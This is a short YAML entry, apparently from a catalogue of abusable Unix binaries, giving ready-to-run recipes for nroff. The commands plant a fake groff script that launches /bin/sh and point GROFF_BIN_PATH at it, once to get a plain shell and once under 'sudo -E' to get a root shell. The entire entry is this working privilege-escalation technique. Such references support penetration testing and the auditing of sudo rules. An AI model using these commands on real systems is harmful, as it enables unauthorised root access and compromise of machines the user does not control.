---
functions:
  shell:
    - code: |
        TF=$(mktemp -d)
        echo '#!/bin/sh' > $TF/groff
        echo '/bin/sh' >> $TF/groff
        chmod +x $TF/groff
        GROFF_BIN_PATH=$TF nroff
  sudo:
    - code: |
        TF=$(mktemp -d)
        echo '#!/bin/sh' > $TF/groff
        echo '/bin/sh' >> $TF/groff
        chmod +x $TF/groff
        sudo -E GROFF_BIN_PATH=$TF nroff
---
